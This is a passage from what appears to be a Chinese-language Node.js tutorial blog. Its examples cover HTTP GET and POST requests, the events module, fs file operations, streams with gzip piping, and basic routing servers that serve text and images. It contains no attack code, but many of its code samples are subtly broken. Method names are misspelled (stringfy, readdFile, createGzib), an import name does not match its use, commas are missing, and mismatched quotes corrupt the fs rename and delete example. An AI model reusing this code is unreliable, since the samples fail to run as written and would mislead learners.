class="function">(<span class="params">item</span>) =&gt;</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(item.title); <span class="comment">// 第一页的电影标题</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">request.on(<span class="string">'error'</span>, (error)=&gt;&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">request.end()</span><br></pre></td></tr></table></figure><p>POST方法提交表单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Http模块的request方法的post方法提交表单</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">const</span> qs = <span class="built_in">require</span>(<span class="string">'querystring'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="keyword">var</span> postData = querystring.stringfy(&#123;</span><br><span class="line">  <span class="string">'question[title]'</span>:<span class="string">'哈哈哈'</span>,</span><br><span class="line">  <span class="string">'question[content]'</span>:<span class="string">'我的内容'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  hostname: <span class="string">'www.codingke.com'</span>,</span><br><span class="line">  port: <span class="number">80</span>,</span><br><span class="line">  method: <span class="string">'POST'</span>,</span><br><span class="line">  path: <span class="string">'/ajax/course/question'</span></span><br><span class="line">  headers: &#123;  <span class="comment">// 因为登录之后才能提交，所有这里...</span></span><br><span class="line">    <span class="string">'Cookie'</span>:<span class="string">'xxxx'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'xxxx'</span>,</span><br><span class="line">    <span class="string">'xxx'</span>:<span class="string">'xxx'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>:postData.length</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> request = http.request(options, (res) =&gt;&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Status:'</span> + res.statusCode);</span><br><span class="line">  res.setEncoding(<span class="string">'utf8'</span>)</span><br><span class="line">  res.on(<span class="string">'data'</span>, (chunk)=&gt;&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(chunk);</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  res.on(<span class="string">'end'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"表单提交完毕"</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//提交表单</span></span><br><span class="line">request.write(postData)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">request.on(<span class="string">'error'</span>, (error)=&gt;&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">request.end()</span><br></pre></td></tr></table></figure><h4 id="4-Events事件模块"><a href="#4-Events事件模块" class="headerlink" title="4).  Events事件模块"></a>4).  Events事件模块</h4><p>使用事件: <code>EventEmitter</code>类</p><p>事件的参数</p><p>只执行一个的事件监听器</p><p>比如：更新、发布 都是一个事件</p><p>小例子:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EventEmitter = <span class="built_in">require</span>(<span class="string">'events'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Player</span> <span class="keyword">extends</span> <span class="title">EventEmitter</span></span>&#123;&#125;  <span class="comment">//继承类</span></span><br><span class="line"><span class="comment">//实例化对象</span></span><br><span class="line"><span class="keyword">var</span> player = <span class="keyword">new</span> Player()</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义一个函数(不过我这里是用的匿名函数)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ev1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"嘻嘻"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听事件(这里用的匿名函数)</span></span><br><span class="line">player.on(<span class="string">'play'</span>, (track)=&gt;&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`正在播放: 《<span class="subst">$&#123;track&#125;</span>》`</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// emit订阅事件，传递参数</span></span><br><span class="line">player.emit(<span class="string">'play'</span>,<span class="string">"被风吹过的夏天"</span>)</span><br><span class="line"><span class="comment">//事件定义之后，可以多次触发</span></span><br><span class="line">player.emit(<span class="string">'play'</span>,<span class="string">"朋友请听好"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// once 不论你定义几次，只会触发一次</span></span><br><span class="line">player.once(<span class="string">'play'</span>,<span class="string">"陈情令"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// removeListener 移除指定的监听事件</span></span><br><span class="line"><span class="comment">//player.removeListener('')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// removeAllListeners    移除所有的监听事件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// eventNames方法可以罗列出已注册的所有监听器的事件，类型为数组</span></span><br></pre></td></tr></table></figure><h4 id="5-fs-文件系统"><a href="#5-fs-文件系统" class="headerlink" title="5). fs 文件系统"></a>5). fs 文件系统</h4><p>得到文件与目录信息：<code>stat</code></p><p>创建一个目录：<code>mkdir</code></p><p>创建文件并写入内容：<code>writeFile</code>,<code>appendFile</code></p><p>读取文件的内容：<code>readFile</code></p><p>列出目录的东西：<code>readdir</code></p><p>重命名目录或文件：<code>rename</code></p><p>删除目录与文件：<code>rndir</code>,<code>unlink</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line">fs.stat(<span class="string">'index.js'</span>, (error,stats) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(stats);  <span class="comment">//打印文件的一些信息</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`文件：<span class="subst">$&#123;stats.isFile()&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`目录：<span class="subst">$&#123;stats.isDirectory()&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//新建目录</span></span><br><span class="line">fs.mkdir(<span class="string">'logs'</span> (error) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功创建目录: logs"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 往文件写内容(如果文件不存在，就先创建)</span></span><br><span class="line">fs.writeFile(<span class="string">'logs/hello.log'</span>, <span class="string">"hello ~\n"</span> , (error) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功向文件logs/hello.log写入内容 "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改文件内容</span></span><br><span class="line">fs.writeFile(<span class="string">'logs/hello.log'</span>, <span class="string">"你好 ~\n"</span> , (error) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功修改文件logs/hello.log内容 "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 追加文件内容</span></span><br><span class="line">fs.appendFile(<span class="string">'logs/hello.log'</span>, <span class="string">"新添加的一行 ~\n"</span> , (error) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功添加内容文件logs/hello.log "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件内容</span></span><br><span class="line">fs.readdFile(<span class="string">'logs/hello.log'</span>,<span class="string">'utf8'</span>, (error,data) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功读取文件logs/hello.log内容"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">    <span class="comment">//console.log(data.toString());</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件夹列表</span></span><br><span class="line">fs.readdir(<span class="string">'logs/'</span>, (error,data) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"成功读取文件夹logs/列表 "</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">    <span class="comment">//console.log(data.toString());</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//对文件重命名  、修改文件夹名字一样</span></span><br><span class="line">fs.rename(<span class="string">'logs/hello.log'</span>, <span class="string">"logs/hello_new.log"</span> , (error) =&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'重命名文件名logs/hello.log ");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//循环删除文件</span></span><br><span class="line"><span class="string">fs.readdirSync('</span>logs<span class="string">').map((file) =&gt;&#123;</span></span><br><span class="line"><span class="string">  fs.unlink(`logs/$&#123;file&#125;`, (error) =&gt;&#123;</span></span><br><span class="line"><span class="string">    if(error)&#123;</span></span><br><span class="line"><span class="string">      console.log(error);</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">      console.log(`成功删除文件logs/$&#123;file&#125;`);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;)</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//删除文件夹</span></span><br><span class="line"><span class="string">fs.rmdir('</span>logs<span class="string">',  (error) =&gt;&#123;</span></span><br><span class="line"><span class="string">  if(error)&#123;</span></span><br><span class="line"><span class="string">    console.log(error);</span></span><br><span class="line"><span class="string">  &#125;else&#123;</span></span><br><span class="line"><span class="string">    console.log('</span>成功删除目录:logs/ <span class="string">");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br></pre></td></tr></table></figure><h4 id="6-Stream"><a href="#6-Stream" class="headerlink" title="6). Stream"></a>6). Stream</h4><p>文件流</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fileReadStrem = fs.createReadStream(<span class="string">'data.json'</span>)</span><br><span class="line"><span class="keyword">var</span> fileWriteStrem = fs.createWriteStream(<span class="string">'data1.json'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件流</span></span><br><span class="line">fileReadStrem.once(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(chunk.toString());</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fileReadStrem.on(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123; ++count &#125;</span> 接收到：<span class="subst">$&#123;chunk.length&#125;</span>`</span>);</span><br><span class="line">  <span class="comment">//写入文件流</span></span><br><span class="line">  fileWriteStrem.write(chunk)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fileReadStrem.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"-- 结束  --"</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fileReadStrem.on(<span class="string">'error'</span>, (error) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>pipe </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> zlib = <span class="built_in">require</span>(<span class="string">'zlib'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fileReadStrem = fs.createReadStream(<span class="string">'data.json'</span>)</span><br><span class="line"><span class="keyword">var</span> fileWriteStrem = fs.createWriteStream(<span class="string">'data1.json'</span>)</span><br><span class="line"></span><br><span class="line">fileWriteStrem.on(<span class="string">'pipe'</span>, (source) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(source); <span class="comment">//将写入的内容通过管道打印一下</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件流的内容放到文件写入流   管道</span></span><br><span class="line">fileReadStrem</span><br><span class="line">  .pipe(zlib.createGzib())</span><br><span class="line">  .pipe(fileWriteStrem)</span><br></pre></td></tr></table></figure><h2 id="五-使用Node创建后端路由"><a href="#五-使用Node创建后端路由" class="headerlink" title="五.使用Node创建后端路由"></a>五.使用Node创建后端路由</h2><p><strong>使用supervisor运行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装：</span></span><br><span class="line">npm install supervisor -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">supervisor router_1.js</span><br></pre></td></tr></table></figure><p><strong>最简单路由</strong></p><p>router_1.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> route = <span class="built_in">require</span>(<span class="string">'./modules/route.js'</span>)</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'text/html;charset=utf-8'</span>&#125;)</span><br><span class="line">  <span class="keyword">if</span>(req.url !== <span class="string">'/favicon.ico'</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pathName = url.parse(req.url).pathname.replace(<span class="regexp">/\//</span>,<span class="string">''</span>) <span class="comment">//http://localhost:8000/login就是login</span></span><br><span class="line">    <span class="built_in">console</span>.log(pathName);</span><br><span class="line">    <span class="keyword">try</span>&#123;  <span class="comment">//最简单的异常处理</span></span><br><span class="line">      route[pathName](req, res)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">      route[<span class="string">'home'</span>](req, res)  <span class="comment">//默认路由，如果不存在哪个路由，就返回这个路由</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  res.end()</span><br><span class="line">&#125;).listen(<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://localhost:8000'</span>);</span><br></pre></td></tr></table></figure><p>route.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  home: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"欢迎来到首页"</span>)  <span class="comment">// 默认路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"登录界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  registor: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"注册界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>读取图片</strong></p><p>router_02.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> route = <span class="built_in">require</span>(<span class="string">'./modules/route.js'</span>)</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'image/jpeg'</span>&#125;)</span><br><span class="line">  <span class="keyword">if</span>(req.url !== <span class="string">'/favicon.ico'</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pathName = url.parse(req.url).pathname.replace(<span class="regexp">/\//</span>,<span class="string">''</span>) <span class="comment">//http://localhost:8000/login就是login</span></span><br><span class="line">    <span class="built_in">console</span>.log(pathName);</span><br><span class="line">    <span class="keyword">try</span>&#123;  <span class="comment">//最简单的异常处理</span></span><br><span class="line">      route[pathName](req, res)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">      route[<span class="string">'home'</span>](req, res)  <span class="comment">//默认路由，如果不存在哪个路由，就返回这个路由</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//res.end()</span></span><br><span class="line">&#125;).listen(<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://localhost:8000'</span>);</span><br></pre></td></tr></table></figure><p>route.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="built_in">require</span>(<span class="string">'./file.js'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  home: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"欢迎来到首页"</span>)  <span class="comment">// 默认路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"登录界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  registor: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"注册界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  img: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//读取文件，也新建一个模块</span></span><br><span class="line">    file.readImg(<span class="string">'./images/1.jpg'</span>, res)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>file.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  readImg: <span class="function">(<span class="params">file, res</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(file, <span class="string">'binary'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">      res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'image/jpeg'</span>&#125;)</span><br><span class="line">      res.write(data, <span class="string">'binary'</span>)</span><br><span class="line">      res.end()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>文字和图片一起显示</strong></p><p>使用html文件</p><p>views/home.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    首页</span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span 